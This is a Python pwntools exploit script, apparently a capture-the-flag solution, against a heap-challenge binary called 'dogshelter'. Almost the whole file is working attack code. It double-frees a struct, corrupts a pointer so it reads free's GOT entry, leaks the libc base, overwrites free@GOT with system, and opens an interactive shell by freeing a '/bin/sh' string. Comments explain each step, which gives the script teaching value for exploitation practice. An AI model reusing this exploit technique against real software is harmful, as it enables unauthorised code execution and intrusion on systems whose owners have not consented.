import pwn, sys

if len(sys.argv) < 2:
	r = pwn.process("./dogshelter")
elif sys.argv[1] == "d":
	r = pwn.remote("localhost", 12345)

# objdump -d dogshelter -s -j .plt | grep free
free_got = 0x602018
# readelf -s libc_50390b2ae8aaa73c47745040f54e602f.so.6 | grep " \(free\|system\)@"
free_rel = 0x97950
system_rel = 0x4f440

# dog struct:
# 4 byte (int): age
# 4 byte: padding
# 8 byte (char *): name
# total: 16 bytes

# - prepare dogs
r.sendline("1")
r.sendline("A"*16)
r.sendline("1")

# intentionally larger buffer size to make sure this does
# not get placed in same freelist as others
r.sendline("1")
r.sendline("B"*0x40)
r.sendline("2")

# this nice shell-doge will give you the shell when you release him/her
r.sendline("1")
r.sendline("/bin/sh")
r.sendline("3")

# - release
r.sendline("3")
r.sendline("0")

r.sendline("3")
r.sendline("1")

# release first dog again
r.sendline("3")
r.sendline("0")

# freelist should now look like:
# dog_name_0 <- dog_struct_0 <- dog_struct_1 <- dog_name_0 <- dog_struct_0
# (note: dog_name_1 will be replaced in another freelist because it is larger)

# - allocate
# this doggo's struct address is dog_struct_0
# and doggo name points to dog_name_0
r.sendline("1")
r.sendline("A"*16)
r.sendline("1")


# this doggo's struct address is dog_struct_1
# but the doggo name points to dog_struct_0
# writing to this doggo's name will result in overwriting previous doggo's dog struct
# overwrite the first dog's name ptr so it points at free GOT
r.sendline("1")
r.sendline("B"*8 + pwn.p64(free_got).replace("\0", ""))
r.sendline("0")

# - info leak
# first dog's name ptr is now pointing at free GOT
# and viewing the dog's name will show the address to free function
r.sendline("4")
r.recvuntil("[0] ")

# convert the name to number
free_addr = pwn.u64(r.readuntil(" | ")[:-3].ljust(8, "\0"))

# calculate the start of libc
# and then the system function
libc_addr = free_addr - free_rel
system_addr = libc_addr + system_rel

print "free_addr: %08x" % free_addr
print "libc_addr: %08x" % libc_addr
print "system_addr: %08x" % system_addr

# overwrite free GOT value with system function address
r.sendline("2")
r.sendline("0")

r.sendline(pwn.p64(system_addr))

# releasing the /bin/sh dog will cause free function (replaced with system)
# to be called like free("/bin/sh") => system("/bin/sh")
r.sendline("3")
r.sendline("2")

r.clean()

# cat flag.txt or something
r.interactive()
